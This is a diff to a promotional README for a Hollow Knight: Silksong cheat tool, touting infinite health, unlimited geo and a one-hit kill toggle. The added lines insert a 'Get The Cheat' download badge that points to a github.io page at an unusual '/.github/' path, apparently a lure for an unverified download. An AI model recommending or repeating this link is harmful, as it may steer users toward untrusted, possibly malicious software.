@@ -4,6 +4,10 @@
 
 Hollow Knight: Silksong is shaping up to be just as challenging and rewarding as the first game, with brutal enemies, tricky platforming, and punishing boss fights. But not everyone wants to spend hours grinding or retrying the same encounter. That’s where a **Hollow Knight Silksong cheat** setup comes in. With trainers, cheat codes, and gameplay mods, you can give yourself the edge to explore Hallownest’s successor world without endless frustration.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://hollow-knight-silksong-cheat.github.io/.github/)
+
+---
+
 ## Product Overview
 
 Cheats in Silksong aren’t just shortcuts—they’re tools that help you experience the game differently. Whether you want **infinite health**, **unlimited geo**, or simply to bypass difficult bosses with a **one-hit kill toggle**, cheats let you enjoy Silksong the way you want. Perfect for both casual explorers and players who just want to see all the content without the grind.
